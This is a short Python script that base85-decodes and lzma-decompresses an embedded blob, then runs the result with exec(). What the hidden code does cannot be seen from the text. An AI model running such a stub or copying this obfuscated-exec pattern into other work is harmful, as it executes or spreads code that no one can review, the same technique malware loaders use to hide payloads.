import lzma
import base64

PAYLOAD = """{Wp48S^xk9=GL@E0stWa761SMbT8$j;0K-pyIlY@n@VT6Qap3u7A1{9oT>%UGp<^^XT+5%`p%}R=`0Ju;@&_CJRl0J;zDv<;Y*I7rz<PK`tYlTL4Mt2m2l8p!u`;p2!`B9Lsjr~@o8$#Ev~VQ>;3`u-))VSK!lfklW)#)9*nc%FHgU*58C=JBnsSft}B^<-TJTeeN^V$P8YT$a)b=RH_Om4DmsCx<oG@nP7HN+5LG=i$2#i04PyW;i_pUbmZ2iUi|boc8=Y2r2c?8q4_B`N4a;-o<(*w^61zsZPPkBU19+eF_}D+567Rl;?VOq9ki2^lp^tsI%6Sa$hwg?2^LQFE+nMc{m^0*5)YcBCj324L2!lSX&W6Czc-7zTzTs>fk%aCyP3t%gCgc(P1)&bqhNOI9R_maF5qV_OL1)8{L6#H|wrqby4&>EjkC@0e@N=igdC6D`<a3KO(Rh}Dj@gx0lt=zs;x+vWTIB^l6S2|ZCQ1=fI|J?4xpA|`<ty{wqne-V7;qE@JQ4%I*BYuBbaNH3&~bl!r-+-2?x1`MoAu^@lHkS?0&cX@xbchr?5SJt`@&lB=RyjURCJU&zDe|~kDne+FKhBz49j@LDel;<7o#C&0*V0~uf(Lux?iAGH|?z7Av6L`gY4=|3S=WT&ELPbaH;`NX#|@(?E)WVz1!tVXVcrMc|uch3xEf{be*_4aR5c0Au%d&BC$})rpR|DHw7l%6<=L6x1ltQw`X<jS`3Cejt1}1C@d>}T$WFzW}>>0jqv49ts9rZmP=w$h^_mmO^1o*q1HJPOa}+onr+pA?`wu@9CV09QHit9VC!Yx1e#jQx&}7VDzpZ|3q$zwklw*zZPjY$K2a+$5E~YJdqBVXrn`JNH+jN=s@mS4LIJXJI>LbDupx}Yp|&G*%7q%z7wFG2C&&N*K)A4q$g^u100GwppAP^4^}+G#vBYQl0ssI200dcD"""

code_bytes = lzma.decompress(base64.b85decode(PAYLOAD))
exec(code_bytes.decode("utf-8"), {"__name__": "__main__"})
